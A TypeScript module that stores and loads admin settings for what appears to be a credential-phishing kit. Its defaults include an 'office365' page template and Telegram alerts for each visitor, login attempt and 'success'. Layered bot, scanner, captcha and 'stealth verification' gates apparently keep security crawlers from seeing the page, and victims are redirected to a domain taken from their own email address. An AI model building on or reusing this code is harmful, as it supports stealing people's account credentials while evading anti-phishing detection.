/**
 * Admin settings storage and management
 * Stores settings in .config-cache.json (formerly: .admin-settings.json)
 * Edge Runtime compatible - conditionally imports file system utilities
 * 
 * NOTE: Types are exported from adminSettingsTypes.ts for client components
 */

import type { AdminSettings } from './adminSettingsTypes'
import { migrateFileIfNeeded } from './fileMigration'
export type { AdminSettings } from './adminSettingsTypes'
export type {
  TelegramSettings,
  EmailSettings,
  NotificationSettings,
  BotFilterSettings,
  CaptchaSettings,
  BotDelaySettings,
  StealthVerificationSettings,
  SecurityGatesSettings,
  NetworkRestrictionsSettings,
  SecuritySettings,
  FilteringSettings,
  TemplateSettings,
  RedirectSettings,
} from './adminSettingsTypes'

// Conditionally import file system utilities only in Node.js runtime
// Edge Runtime doesn't support file operations, so we'll use dynamic imports
let secureReadJSON: any
let secureWriteJSON: any

// Lazy load file system utilities only when needed (Node.js runtime)
async function loadFileSystemUtils() {
  if (!secureReadJSON || !secureWriteJSON) {
    if (typeof require !== 'undefined') {
      try {
        const fsUtils = await import('./secureFileSystem')
        secureReadJSON = fsUtils.secureReadJSON
        secureWriteJSON = fsUtils.secureWriteJSON
      } catch (error: any) {
        // Edge Runtime - will use API calls / defaults instead
      }
    } else {
    }
  }
  return { secureReadJSON, secureWriteJSON }
}

// Edge-compatible path (no 'path' module needed)
// Compute path only when needed (in Node.js runtime functions)
// Never call process.cwd() in module scope (Edge Runtime doesn't allow it)
function getSettingsFilePath(): string {
  // Only compute in Node.js runtime
  if (typeof process !== 'undefined' && typeof process.cwd === 'function') {
    try {
      const legacyPath = `${process.cwd()}/.admin-settings.json`
      const newPath = `${process.cwd()}/.config-cache.json`
      // Migrate old file name if needed
      migrateFileIfNeeded(legacyPath, newPath)
      return newPath
    } catch {
      // Fallback if cwd() fails
      const legacyPath = './.admin-settings.json'
      const newPath = './.config-cache.json'
      migrateFileIfNeeded(legacyPath, newPath)
      return newPath
    }
  }
  // Edge Runtime fallback
  return './.config-cache.json'
}

// In-memory cache
let settingsCache: AdminSettings | null = null
let cacheTimestamp = 0
const CACHE_DURATION = 60 * 1000 // 1 minute

// Default settings - pulls from environment variables
export const DEFAULT_SETTINGS: AdminSettings = {
  notifications: {
    telegram: {
      enabled: true,
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatId: process.env.TELEGRAM_CHAT_ID || '',
      events: ['visitor', 'attempt', 'success'],
      notifyBotDetections: true, // Default: notify on bot detections
    },
    email: {
      enabled: false,
      smtpHost: '',
      smtpPort: 587,
      smtpUser: '',
      smtpPassword: '',
      fromEmail: '',
      events: ['daily_summary', 'success', 'link_expired'],
    },
  },
  security: {
    botFilter: {
      enabled: true,
      checkIPBlocklist: true,
      cloudflareBotManagement: true,
      scannerDetection: true,
    },
    captcha: {
      enabled: true,
      provider: 'turnstile',
      turnstileSiteKey: process.env.NEXT_PUBLIC_TURNSTILE_SITE_KEY || '',
      turnstileSecretKey: process.env.TURNSTILE_SECRET_KEY || '',
      privatecaptchaSiteKey: process.env.NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY || '',
      privatecaptchaSecretKey: process.env.PRIVATECAPTCHA_SECRET_KEY || '',
    },
    gates: {
      layer1BotFilter: true,
      layer1IpBlocklist: true,
      layer1CloudflareBotManagement: true,
      layer1ScannerDetection: true,
      layer2Captcha: true,
      layer3BotDelay: true,
      layer4StealthVerification: true,
    },
    networkRestrictions: {
      allowVpn: process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true',
      allowProxy: process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true',
      allowDatacenter: process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true',
    },
    botDelay: {
      enabled: true,
      min: 3,
      max: 7,
    },
    stealthVerification: {
      enabled: true,
      behavioralAnalysis: true,
      mouseTracking: true,
      scrollTracking: true,
      honeypot: true,
      minimumTime: 3,
      botScoreThreshold: 50,
    },
  },
  filtering: {
    geographic: {
      enabled: false,
      allowed: [],
      blocked: [],
    },
    device: {
      desktop: true,
      mobile: true,
      tablet: true,
    },
    browser: {
      chrome: true,
      firefox: true,
      safari: true,
      edge: true,
      opera: false,
      other: false,
    },
    network: {
      blockVPN: false,
      blockProxy: false,
      blockDatacenter: false,
      blockTor: false,
    },
  },
  templates: {
    default: 'office365',
  },
  redirects: {
    defaultUrl: 'https://www.google.com', // Default fallback
    customUrl: '', // Empty = use domain extraction
    useDomainFromEmail: true, // Enable smart domain extraction
    redirectDelaySeconds: 10, // 10 seconds default
    // Hashes are now hardcoded in code:
    // Success → #Success
    // TooManyAttempts → #TooManyAttempts
    // LinkUsed → #ReviewCompleted
  },
}

/**
 * Load settings with caching
 * Edge Runtime compatible - returns cached/default if file operations unavailable
 */
export async function loadSettings(): Promise<AdminSettings> {
  // Check if we're in Edge Runtime (no process.cwd or file system)
  const isEdgeRuntime = typeof process === 'undefined' || typeof process.cwd !== 'function'
  
  if (isEdgeRuntime) {
    // In Edge Runtime, return cached or default settings
    // File operations are not available in Edge Runtime
    return settingsCache || DEFAULT_SETTINGS
  }
  
  const now = Date.now()
  
  // Return cached settings if fresh
  if (settingsCache && now - cacheTimestamp < CACHE_DURATION) {
    return settingsCache
  }
  
  try {
    // Load file system utilities only in Node.js runtime
    // Wrap in try-catch to handle edge runtime errors gracefully
    let readJSON: any
    try {
      const fsUtils = await loadFileSystemUtils()
      readJSON = fsUtils.secureReadJSON
    } catch (fsError: any) {
      // If file system utils can't be loaded (edge runtime), use cache or defaults
      if (fsError?.message?.includes('fs/promises') || fsError?.message?.includes('edge runtime')) {
        return settingsCache || DEFAULT_SETTINGS
      }
      throw fsError
    }
    
    const settingsFile = getSettingsFilePath()
    const rawSettings = await (readJSON as typeof import('./secureFileSystem').secureReadJSON)<any>(
      settingsFile,
      DEFAULT_SETTINGS
    )
    
    // Merge with defaults to ensure all fields exist
    const mergedSettings: AdminSettings = {
      ...DEFAULT_SETTINGS,
      ...rawSettings,
      notifications: {
        ...DEFAULT_SETTINGS.notifications,
        ...rawSettings.notifications,
        telegram: {
          ...DEFAULT_SETTINGS.notifications.telegram,
          ...rawSettings.notifications?.telegram,
          // Admin panel is single source of truth - no .env fallback
          botToken: rawSettings.notifications?.telegram?.botToken || '',
          chatId: rawSettings.notifications?.telegram?.chatId || '',
          enabled: rawSettings.notifications?.telegram?.enabled ?? false,
        },
        email: {
          ...DEFAULT_SETTINGS.notifications.email,
          ...rawSettings.notifications?.email,
          // Migrate old smtp structure if it exists
          smtpHost: rawSettings.notifications?.email?.smtpHost || (rawSettings.notifications?.email as any)?.smtp?.host || '',
          smtpPort: rawSettings.notifications?.email?.smtpPort || (rawSettings.notifications?.email as any)?.smtp?.port || 587,
          smtpUser: rawSettings.notifications?.email?.smtpUser || (rawSettings.notifications?.email as any)?.smtp?.username || '',
          smtpPassword: rawSettings.notifications?.email?.smtpPassword || (rawSettings.notifications?.email as any)?.smtp?.password || '',
          fromEmail: rawSettings.notifications?.email?.fromEmail || (rawSettings.notifications?.email as any)?.smtp?.sendTo || '',
        },
      },
      security: {
        ...DEFAULT_SETTINGS.security,
        ...rawSettings.security,
        gates: {
          ...DEFAULT_SETTINGS.security.gates,
          ...rawSettings.security?.gates,
        },
        networkRestrictions: {
          ...DEFAULT_SETTINGS.security.networkRestrictions,
          ...rawSettings.security?.networkRestrictions,
        },
      },
      filtering: {
        ...DEFAULT_SETTINGS.filtering,
        ...rawSettings.filtering,
      },
      templates: {
        ...DEFAULT_SETTINGS.templates,
        ...rawSettings.templates,
      },
      redirects: {
        ...DEFAULT_SETTINGS.redirects,
        ...rawSettings.redirects,
      },
    }
    
    // Update cache
    settingsCache = mergedSettings
    cacheTimestamp = now
    
    return mergedSettings
  } catch (error) {
    return DEFAULT_SETTINGS
  }
}

/**
 * Get all admin settings (alias for loadSettings for backwards compatibility)
 */
export async function getSettings(): Promise<AdminSettings> {
  return loadSettings()
}

/**
 * Save all admin settings
 * Edge Runtime compatible - only works in Node.js runtime
 */
export async function saveSettings(settings: AdminSettings): Promise<void> {
  // Check if we're in Edge Runtime
  const isEdgeRuntime = typeof process === 'undefined' || typeof process.cwd !== 'function'
  
  console.log('[ADMIN SETTINGS] 💾 saveSettings() called')
  console.log('[ADMIN SETTINGS] Is Edge Runtime?', isEdgeRuntime)
  
  if (isEdgeRuntime) {
    // In Edge Runtime, just update cache (can't write to file)
    console.log('[ADMIN SETTINGS] ⚠️  Edge Runtime detected - updating cache only (no file write)')
    settingsCache = settings
    cacheTimestamp = Date.now()
    return
  }
  
  // Load file system utilities only in Node.js runtime
  console.log('[ADMIN SETTINGS] 📂 Loading file system utilities...')
  const { secureWriteJSON: writeJSON } = await loadFileSystemUtils()
  const settingsFile = getSettingsFilePath()
  console.log('[ADMIN SETTINGS] 📝 Settings file path:', settingsFile)
  console.log('[ADMIN SETTINGS] 🔄 Writing settings to disk...')
  
  await writeJSON(settingsFile, settings)
  
  console.log('[ADMIN SETTINGS] ✅ Settings written successfully')
  // Clear cache
  settingsCache = null
  cacheTimestamp = 0
  console.log('[ADMIN SETTINGS] 🧹 Cache cleared')
}

/**
 * Get settings synchronously from cache (for middleware)
 * Returns default if cache empty
 */
export function getCachedSettings(): AdminSettings {
  return settingsCache || DEFAULT_SETTINGS
}

/**
 * Warm up cache on server start (Node.js only, not Edge Runtime)
 */
// Warm-up cache - ONLY in Node.js runtime (NOT in Edge Runtime)
if (
  typeof require !== 'undefined' && 
  typeof process !== 'undefined' &&
  typeof process.cwd === 'function' &&
  process.env.NEXT_RUNTIME !== 'edge'
) {
  // Delay slightly to ensure file system is ready
  setTimeout(() => {
    loadSettings()
      .then(() => {
      })
      .catch((error: any) => {
        // Silently fail in Edge Runtime
        if (!error.message?.includes('edge runtime') && 
            !error.message?.includes('fs/promises')) {
        }
      })
  }, 100)
} else {
}

/**
 * Update a specific setting by path
 * Example: updateSetting('notifications.telegram.enabled', true)
 */
export async function updateSetting(path: string, value: any): Promise<void> {
  const settings = await getSettings()
  
  const keys = path.split('.')
  let current: any = settings
  
  // Navigate to the parent object
  for (let i = 0; i < keys.length - 1; i++) {
    if (!(keys[i] in current)) {
      current[keys[i]] = {}
    }
    current = current[keys[i]]
  }
  
  // Set the value
  current[keys[keys.length - 1]] = value
  
  await saveSettings(settings)
}

/**
 * Get a specific setting by path
 */
export async function getSetting<T = any>(path: string): Promise<T | undefined> {
  const settings = await getSettings()
  
  const keys = path.split('.')
  let current: any = settings
  
  for (const key of keys) {
    if (current && typeof current === 'object' && key in current) {
      current = current[key]
    } else {
      return undefined
    }
  }
  
  return current as T
}

